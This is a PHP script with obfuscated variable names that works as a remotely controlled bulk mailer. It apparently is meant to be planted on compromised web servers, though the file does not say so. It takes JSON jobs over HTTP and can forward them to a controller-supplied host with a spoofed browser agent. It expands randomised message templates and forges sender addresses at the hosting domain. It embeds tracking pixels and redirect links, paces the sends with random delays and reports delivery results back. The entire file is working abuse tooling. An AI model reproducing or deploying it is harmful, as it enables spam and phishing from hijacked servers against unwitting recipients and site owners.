<?php
@ini_set('max_execution_time', '3600'); @ini_set('max_input_time', '3600'); @set_time_limit(3600); @date_default_timezone_set('UTC'); class Macros { private $values = array(); private $fixed = array(); private $used = array(); private $_keys = array(); public function __get($spaf7981) { if ($spaf7981 == 'keys') { return array_keys($this->_keys); } } public function Import($spaf7981, $spcb13c3) { if (is_array($spcb13c3)) { $this->values[$spaf7981] = array(); foreach ($spcb13c3 as $sp81f86f) { if (!empty($sp81f86f['key'])) { $this->values[$spaf7981][$sp81f86f['key']] = $sp81f86f['value']; } else { $this->values[$spaf7981][] = $sp81f86f['value']; } } } else { $this->Assign($spaf7981, $spcb13c3); } } public function Assign($spaf7981, $sp7f3da0) { $this->values[$spaf7981] = $sp7f3da0; } public function Parse($sp2e4bb5) { $spa706bd = ''; $spf81fd8 = 0; while (true) { $spc8c6cd = strpos($sp2e4bb5, '{', $spf81fd8); if ($spc8c6cd === false) { $spa706bd .= substr($sp2e4bb5, $spf81fd8); break; } $spa706bd .= substr($sp2e4bb5, $spf81fd8, $spc8c6cd - $spf81fd8); $spf81fd8 = $spc8c6cd + 1; $sp9695a0 = ''; $sp43700a = '{'; $sp54b701 = array(); $sp5200d0 = false; $spca12cb = false; $sp3cd8b6 = 'var'; while ($spf81fd8 < strlen($sp2e4bb5)) { $sp0c63e7 = substr($sp2e4bb5, $spf81fd8, 1); $sp43700a .= $sp0c63e7; if ($sp0c63e7 == ',' || $sp0c63e7 == '>' || $sp0c63e7 == '|') { if ($sp3cd8b6 == 'alias') { $sp5200d0 = $sp9695a0; } elseif ($sp3cd8b6 == 'mod') { $spca12cb = $sp9695a0; } else { $sp54b701[] = $sp9695a0; } $sp9695a0 = ''; if ($sp0c63e7 == '>') { $sp3cd8b6 = 'alias'; } if ($sp0c63e7 == '|') { $sp3cd8b6 = 'mod'; } $spf81fd8++; continue; } if ($sp0c63e7 == '}') { if ($sp3cd8b6 == 'alias') { $sp5200d0 = $sp9695a0; } elseif ($sp3cd8b6 == 'mod') { $spca12cb = $sp9695a0; } else { $sp54b701[] = $sp9695a0; } $spf81fd8++; break; } $sp9695a0 .= $sp0c63e7; if (preg_match('/[0-9A-Za-z_\\[\\]\\-\\^!]/', $sp0c63e7) == 0) { $spf81fd8++; $sp54b701 = array(); break; } $spf81fd8++; } if (sizeof($sp54b701) == 0) { $spa706bd .= $sp43700a; continue; } $speb0b1a = false; $sp92c5ce = false; if (preg_match('/^\\^/', $sp54b701[0]) > 0) { $sp54b701[0] = substr($sp54b701[0], 1); $speb0b1a = true; } if (preg_match('/^\\!/', $sp54b701[0]) > 0) { $sp54b701[0] = substr($sp54b701[0], 1); $sp92c5ce = true; } $spa9972d = false; if (preg_match('/\\[([0-9A-Za-z_]+)\\]/', $sp54b701[0], $sp870c3b) > 0) { $spa9972d = $sp870c3b[1]; } elseif (preg_match('/\\[([\\d\\-]+)\\]/', $sp54b701[0], $sp870c3b) > 0) { $spa9972d = explode('-', $sp870c3b[1]); } if ($spa9972d !== false) { $sp54b701[0] = substr($sp54b701[0], 0, strpos($sp54b701[0], '[')); } $this->_keys[$sp54b701[0]] = true; if (empty($this->values[$sp54b701[0]]) && empty($this->fixed[$sp54b701[0]])) { continue; } if ($speb0b1a) { unset($this->fixed[$sp54b701[0]]); } if (isset($this->fixed[$sp54b701[0]])) { $sp86b4a7 = $this->fixed[$sp54b701[0]]; } else { $sp86b4a7 = ''; $sp6c2860 = 1; if (sizeof($sp54b701) == 2) { $sp6c2860 = $sp54b701[1]; } if (sizeof($sp54b701) == 3) { $sp6c2860 = rand($sp54b701[1], $sp54b701[2]); } for ($sp679ac3 = 0; $sp679ac3 < $sp6c2860; $sp679ac3++) { if (is_array($this->values[$sp54b701[0]])) { if (!is_array($this->used[$sp54b701[0]])) { $this->used[$sp54b701[0]] = array(); } if (count($this->used[$sp54b701[0]]) == count($this->values[$sp54b701[0]])) { $this->used[$sp54b701[0]] = array(); } if ($spa9972d !== false && is_scalar($spa9972d)) { $sp86b4a7 .= $this->values[$sp54b701[0]][$spa9972d]; $this->used[$spa9972d] = true; } else { $spf64b0c = array(); if (is_array($spa9972d)) { $sp465f14 = $spa9972d[0]; $spea1144 = $spa9972d[1]; } else { $sp465f14 = 0; $spea1144 = count($this->values[$sp54b701[0]]) - 1; } for ($sp06624b = $sp465f14; $sp06624b <= $spea1144; $sp06624b++) { if ($sp92c5ce && !empty($this->used[$sp54b701[0]][$sp06624b])) { continue; } $spf64b0c[] = $sp06624b; } $spa2c482 = $spf64b0c[rand(0, count($spf64b0c) - 1)]; $this->used[$sp54b701[0]][$spa2c482] = true; $sp86b4a7 .= $this->values[$sp54b701[0]][$spa2c482]; } } else { $sp86b4a7 .= $this->values[$sp54b701[0]]; } } } $sp86b4a7 = $this->Parse($sp86b4a7); if ($spca12cb !== false) { for ($sp6da3d2 = 0; $sp6da3d2 < strlen($spca12cb); $sp6da3d2++) { switch (substr($spca12cb, $sp6da3d2, 1)) { case 'b': $sp86b4a7 = base64_encode($sp86b4a7); break; case 'q': $sp86b4a7 = quoted_printable_encode($sp86b4a7); break; default: break; } } } if ($speb0b1a) { $this->fixed[$sp54b701[0]] = $sp86b4a7; } if ($sp5200d0 !== false && $sp5200d0 != '') { $this->fixed[$sp5200d0] = $sp86b4a7; } $spa706bd .= $sp86b4a7; } return $spa706bd; } } $sp14c0aa = file_get_contents('php://input'); $spbeb348 = json_decode($sp14c0aa, true); if (empty($spbeb348['via_proxy'])) { $spbeb348['via_proxy'] = true; $sp820621 = curl_init($spbeb348['prefix'] . $spbeb348['files']['s']); $sp0de4b9 = json_encode($spbeb348); curl_setopt($sp820621, CURLOPT_CONNECTTIMEOUT, 30); curl_setopt($sp820621, CURLOPT_TIMEOUT, 600); curl_setopt($sp820621, CURLOPT_RETURNTRANSFER, true); curl_setopt($sp820621, CURLOPT_USERAGENT, 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15'); curl_setopt($sp820621, CURLOPT_REFERER, $sp2c2af8); curl_setopt($sp820621, CURLOPT_POST, true); curl_setopt($sp820621, CURLOPT_POSTFIELDS, $sp0de4b9); curl_setopt($sp820621, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Content-Length: ' . strlen($sp0de4b9))); $sp2114df = curl_exec($sp820621); echo $sp2114df; die; } $spc27519 = $_SERVER['SERVER_ADDR']; $sp1251f9 = $_SERVER['HTTP_HOST']; $sp1251f9 = preg_replace('/^www\\./', '', $sp1251f9); $spe38b7f = new Macros(); $spe38b7f->Assign('server_addr', $spc27519); $spe38b7f->Assign('server_host', $sp1251f9); foreach ($spbeb348['macros'] as $spaf7981 => $spcb13c3) { $spe38b7f->Import($spaf7981, $spcb13c3); } $sp95b146 = preg_replace('/^www\\./i', '', $sp1251f9); $sp8eeabc = $spe38b7f->Parse('{from_user}@' . $sp95b146); $spe38b7f->Assign('from_email', $sp8eeabc); $spe38b7f->Assign('prefix', $spbeb348['prefix']); $spe38b7f->Assign('html', $spbeb348['letter']['html']); $spf81fd8 = 0; $sp26ad09 = 0; $spfd6b97 = 0; $spa0a793 = array(); foreach ($spbeb348['rcpt'] as $sp39e122) { $spe38b7f->Assign('email', $sp39e122['email']); $spe38b7f->Assign('entry', $sp39e122); $spe38b7f->Assign('date', date('r')); $spe38b7f->Assign('redirect', $spbeb348['prefix'] . $spbeb348['files']['r']); $spe38b7f->Assign('redirect_with_uri', $spbeb348['prefix'] . $spbeb348['files']['r'] . '?uri='); $spe38b7f->Assign('unsubscribe', $spbeb348['prefix'] . $spbeb348['files']['u'] . '?id=' . $sp39e122['id']); $spe38b7f->Assign('delivery', '<img src="' . $spbeb348['prefix'] . $spbeb348['files']['d'] . '?id=' . $sp39e122['id'] . '" />'); $spff2a5f = $spe38b7f->Parse($spbeb348['envelope']['header']); $spb4f2a6 = $spe38b7f->Parse($spbeb348['envelope']['body']); if (!empty($sp39e122['name'])) { $spa0fcbb = $sp39e122['name'] . ' <' . $sp39e122['email'] . '>'; } else { $spa0fcbb = $sp39e122['email']; } $sp1104f3 = $spe38b7f->Parse($spbeb348['letter']['subject']); if ($spf81fd8 > 0) { sleep(rand(3, 8)); } $spa4b88d = mail($spa0fcbb, $sp1104f3, $spb4f2a6, $spff2a5f); $spa0a793[$sp39e122['id']] = $spa4b88d; if ($spa4b88d) { $sp26ad09++; } else { $spfd6b97++; } $spf81fd8++; } echo serialize(array('total' => count($spbeb348['rcpt']), 'sent' => $spf81fd8, 'success' => $sp26ad09, 'error' => $spfd6b97, 'rcpt' => $spa0a793));